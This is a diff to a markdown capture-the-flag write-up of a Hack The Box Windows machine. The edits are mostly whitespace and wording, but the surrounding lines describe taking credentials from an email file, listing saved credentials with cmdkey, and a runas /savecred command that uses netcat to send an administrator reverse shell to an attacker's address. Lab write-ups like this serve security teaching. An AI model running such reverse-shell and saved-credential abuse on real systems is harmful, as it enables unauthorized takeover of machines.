@@ -54,6 +54,7 @@ cat Access\ Control.mbox
 ```
 Within the mbox file we find an email with another set of credentials:  
 ![emailcreds](/boxes/htb/access/email.PNG)  
+
 The credentials in the email gave us access to the machine via telnet and the user flag was found.  
 ![userflag](/boxes/htb/access/user.PNG)
 ### iii. Privilege Escalation
@@ -61,8 +62,9 @@ When performing Windows enumeration one of the things to check for is saved cred
 ```
 cmdkey /list
 ```
-![storedcreds](/boxes/htb/access/creds.PNG)  
-Since stored credentials are available, there are a few options to obtain the root flag. The route we will take is sending ourselves an administrative shell. Within the Kali Linux distribution, you can find precompiled Windows binaries under the following directory:
+![storedcreds](/boxes/htb/access/creds.PNG)
+  
+Since stored credentials are available, there are a few options to capture the root flag. The route we will take is sending ourselves an administrative shell. Within the Kali Linux distribution, you can find precompiled Windows binaries under the following directory:
  ```
  /usr/share/windows-binaries
  ```
@@ -82,6 +84,7 @@ Once the listener is setup, send a shell with the following command:
 runas /user:access\administrator /savecred "cmd /c c:\users\security\nc.exe -nv <ip address> 443 -e c:\windows\system32\cmd.exe
 ```
 The shell is received and is running as an administrative user! You can now capture the root flag!
+
 ![rootshell](/boxes/htb/access/rootshell.PNG)
 
 
